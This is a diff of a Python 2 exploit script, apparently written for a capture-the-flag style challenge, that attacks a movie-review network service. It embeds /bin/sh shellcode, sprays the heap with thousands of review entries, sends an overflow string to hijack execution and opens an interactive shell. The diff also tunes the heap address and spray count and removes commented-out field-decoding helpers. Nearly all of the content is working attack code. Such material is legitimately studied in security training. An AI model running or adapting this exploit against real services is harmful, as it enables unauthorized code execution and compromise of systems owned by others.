@@ -18,7 +18,7 @@ LOCAL = True
 if LOCAL:
     HOST = "localhost"
     PORT = "55000"
-    SLEEP_TIME = .04
+    SLEEP_TIME = 0
 else:
     HOST = "54.215.5.83"
     PORT = "3036"
@@ -26,9 +26,11 @@ else:
 
 NOP = "\x90"
 
-HEAP_ADDRESS = "0x90000000"
+#HEAP_ADDRESS = "\x08\xca\x40\x08"
+HEAP_ADDRESS = "\x08\x28\x20\x08"
+MAX_ENTRIES = 16390
 #MAX_ENTRIES = 16384
-MAX_ENTRIES = 2500
+#MAX_ENTRIES = 2500
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -117,7 +119,7 @@ def remove_movie(title,con):
     # Send the movie title
     con.send_line(title)
 
-    pause_script_msg("Press Enter to receive response")
+    #pause_script_msg("Press Enter to receive response")
 
     # Wait for a response
     time.sleep(1)
@@ -220,6 +222,8 @@ def go_interactive(con):
 ################################################################################
 def hijack_execution(con):
 
+    time.sleep(5)
+
     # Setup overflow string
     overflow_string = ""
     #overflow_size = 512
@@ -234,17 +238,17 @@ def hijack_execution(con):
     con.send_line("d")
 
     # Wait for a response
-    time.sleep(SLEEP_TIME)
+    time.sleep(1)
 
     # Clear out the read buffer
     con.read_one(0)
 
-    #pause_script_msg("Press Enter to Pwn")
+    pause_script_msg("Press Enter to Pwn")
     
     # Send the "movie title"
     con.send_line(overflow_string)
 
-    #go_interactive(con)
+    go_interactive(con)
     #time.sleep(SLEEP_TIME)
 
 ################################################################################
@@ -362,30 +366,25 @@ def build_movie():
      "average_rating" : average_rating
     }
 
-    print "title: " + `len(title)`
-    print "director: " + `len(director)`
-    print "writer: " + `len(writer)`
-    print "star1: " + `len(star1)`
-    print "star2: " + `len(star2)`
-    print "star3: " + `len(star3)`
-    print "star4: " + `len(star4)`
-    print "star5: " + `len(star5)`
-    print "summary: " + `len(summary)`
-    print "country: " + `len(country)`
-    print "budget: " + `len(budget)`
-    print "opening_weekend: " + `len(opening_weekend)`
-    print "gross: " + `len(gross)`
-    print "runtime: " + `len(runtime)`
-    print "aspect: " + `len(aspect)`
-    print "composer: " + `len(composer)`
-    print "average_rating: " + `len(average_rating)`
-
-
+    #print "title: " + `len(title)`
+    #print "director: " + `len(director)`
+    #print "writer: " + `len(writer)`
+    #print "star1: " + `len(star1)`
+    #print "star2: " + `len(star2)`
+    #print "star3: " + `len(star3)`
+    #print "star4: " + `len(star4)`
+    #print "star5: " + `len(star5)`
+    #print "summary: " + `len(summary)`
+    #print "country: " + `len(country)`
+    #print "budget: " + `len(budget)`
+    #print "opening_weekend: " + `len(opening_weekend)`
+    #print "gross: " + `len(gross)`
+    #print "runtime: " + `len(runtime)`
+    #print "aspect: " + `len(aspect)`
+    #print "composer: " + `len(composer)`
+    #print "average_rating: " + `len(average_rating)`
 
     return movie
-
-
-
 
 ################################################################################
 #
@@ -403,7 +402,7 @@ movie = build_movie()
 send_movie(movie, con)
 
 print "Movie sent"
-pause_script_msg("Press Enter to start reviews")
+#pause_script_msg("Press Enter to start reviews")
 
 #go_interactive(con)
 
@@ -418,127 +417,10 @@ for i in range(0, MAX_ENTRIES):
     else:
         print `i` + ": Review Failed!"
 
-hijack_execution(con)
-
-
-
-
-################################################################################
-#
-#   Spare Code
-#
-################################################################################
-
-
-
-#send_movie(hacker,con)
-#if remove_movie("Hackers",con):
-#if remove_movie(build_nop_string(500),con):
+#if remove_movie(title, con):
 #    print "Deleted!"
 #else:
 #    print "Didn't delete :("
 
-
-
-#exit(0)
-#send_movie(hacker, con)
-
-#test_string = ("this"
-#    "is"
-#    "a"
-#    "test"
-#    "string")
-#print test_string
-
-
-    # Fix permutated fields
-    #permStar_3 = [13, 1, 0, 12, 2, 11, 4, 10, 14, 5, 8, 6, 3, 7, 9]
-    #star3 = undo_permute(star3, 300, permStar_3, 15)
-
-    #permSummary = [191, 59, 91, 88, 103, 109, 157, 119, 35, 38, 80, 107, 99, 153, 49, 143, 
-    #    100, 33, 36, 42, 135, 44, 56, 169, 194, 28, 172, 186, 189, 19, 16, 112, 51, 165, 
-    #    53, 156, 181, 144, 136, 177, 128, 126, 159, 120, 68, 176, 5, 15, 29, 84, 21, 8, 
-    #    31, 166, 193, 93, 116, 179, 87, 140, 17, 146, 75, 89, 97, 134, 161, 67, 46, 55, 
-    #    122, 12, 76, 86, 174, 163, 168, 34, 24, 150, 158, 45, 30, 32, 138, 82, 63, 184, 
-    #    131, 39, 9, 198, 121, 3, 105, 43, 199, 18, 14, 81, 149, 164, 118, 23, 71, 178, 
-    #    190, 187, 57, 78, 129, 151, 106, 73, 141, 61, 98, 11, 192, 69, 60, 182, 160, 173, 
-    #    117, 58, 108, 83, 48, 27, 124, 102, 22, 185, 79, 170, 66, 96, 104, 41, 123, 40, 
-    #    197, 132, 180, 111, 20, 85, 54, 148, 101, 137, 113, 7, 65, 47, 142, 26, 25, 183, 
-    #    6, 114, 162, 175, 37, 70, 92, 74, 13, 94, 154, 155, 115, 64, 1, 10, 50, 95, 152, 
-    #    62, 4, 0, 77, 196, 133, 130, 147, 188, 2, 127, 139, 167, 171, 145, 90, 125, 110, 
-    #    52, 72, 195]
-    #summary = undo_permute(summary, 2000, permSummary, 200)
-
-    # Fix xor fields
-    #keyDirector = "\x26\xf8\x2b\xff\x7b\x2d"
-    #keyStar_2 = "\xe7\x1e\x90\xa1\x80\x93\xb5\x83\x3a\xe4"
-    #keyBudget = "\x63\x51\x13\xbe"
-    #keyOpening_Weekend = ("\xd6\x22\x9a\x95\x9e\xb1\x65\xf5\x72\x1f\xd9\x2e\x71\x2e\x58\xae"
-    #    "\xe8\x2e\x44\xe5\x44\xee\x5f\xd4\x86\xdc\x10\xd5\xe6\x70\x38\xac\xb0\x80\xd6\x79"
-    #    "\x46\x96\x85\x0a\xac\x4f\x8c\xa9\xb7\x98\x2d\xab\x14\x1a\x8b\x26\x36\x1d\x3e\xb8"
-    #    "\x4f\x21\xe5\xfe\xa3\xf7\xde\x26\xea\xdb\xe2\x67\xe0\xde\xca\xdc\x14\xbe\xa2\xff\x28\xd2\x8e\x14")
-    #keyGross = "\xcf\x1e\x33\x4a\x8f\x26\xcd\x8d\x86\x8c\x4e\x76\x3f\x1f\xa6\xe3\x2d\xa9\x85\xdd"
-    #keyRuntime = "\xfc\x8c\xc7\x03\xe3\x5a\xad\x30\x0c\x2d\x4d\x1c\xee\x37\xb1\x51\x75\x99\xed\x96"
-    #keyAspect = "\xf1\xcd"
-    #keyComposer = "\xa0\x31\x7b\xd5\xfd\xd9\xbc\x27\x03\xb4\x83\xb7\xf1\xba\xe7"
-
-    #director = undo_xor(director, 300, keyDirector, 6)
-    #star2 = undo_xor(star2, 300, keyStar_2, 10)
-    #budget = undo_xor(budget, 80, keyBudget, 4)
-    #opening_weekend = undo_xor(opening_weekend, 80, keyOpening_Weekend, 80)
-    #gross = undo_xor(gross, 80, keyGross, 20)
-    #runtie = undo_xor(runtime, 80, keyRuntime, 20)
-    #aspect = undo_xor(aspect, 40, keyAspect, 2)
-    #composer = undo_xor(composer, 300, keyComposer, 15)
-
-################################################################################
-#
-#   undo_xor
-#
-################################################################################
-#def undo_xor(field, field_len, xor_key, xor_key_len):
-#
-#    field = list(field)
-#
-#    if (field_len % xor_key_len != 0):
-#        print "undo_xor error"
-#        return
-#
-#    for keyItr in range (0,  field_len / xor_key_len):
-#        base = keyItr * xor_key_len;
-#        for index in range (0, xor_key_len):
-#            field[base + index] = int(field[base+index],base=16) ^ int(xor_key[index], base=16)
-#
-#    field = "".join(field)
-#    return field
-
-################################################################################
-#
-#   undo_permute
-#
-################################################################################
-#def undo_permute(field, fieldLen, perm, permLen):
-#
-#    field = list(field)
-#
-#    tmp = [0 for i in range(permLen)]
-#
-#    if(fieldLen % permLen != 0):
-#        print "undo_permute error"
-#        return
-#    for permItr in range( 0,fieldLen / permLen):
-#        base = permItr * permLen
-#
-#        #copy into tmp
-#        for index in range(0,permLen):
-#            tmp[perm[index]] = field[index]
-#
-#        #copy back into field
-#        for index2 in range(0,permLen):
-#            field[base+index2] = tmp[index2]
-#
-#    field = "".join(field)
-#    return field
-
-
+hijack_execution(con)
 
